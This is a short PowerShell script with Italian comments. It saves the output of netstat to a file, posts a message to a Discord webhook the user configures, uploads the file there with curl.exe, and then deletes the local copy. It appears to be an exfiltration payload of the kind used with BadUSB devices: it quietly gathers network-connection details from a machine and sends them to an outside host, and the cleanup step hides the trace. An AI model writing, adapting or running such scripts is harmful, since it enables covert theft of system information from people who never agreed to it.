# Ricordati di dichiarare la variabile $webhook con il link discord
# Esegue il comando netstat e salva l'output nel file specificato
echo "NETSTAT OUTPUT" > netstat.txt
netstat >> netstat.txt

# Contenuto del messaggio Discord
$message = "Output di netstat:"

# Creazione dei dati da inviare al webhook
$data = @{
    name = "Jarvis"
    content = $message
} | ConvertTo-Json

# Invia il messaggio Discord tramite Invoke-RestMethod
Invoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType "application/json"
curl.exe -F "file1=@netstat.txt" $webhook
Remove-Item '.\netstat.txt'
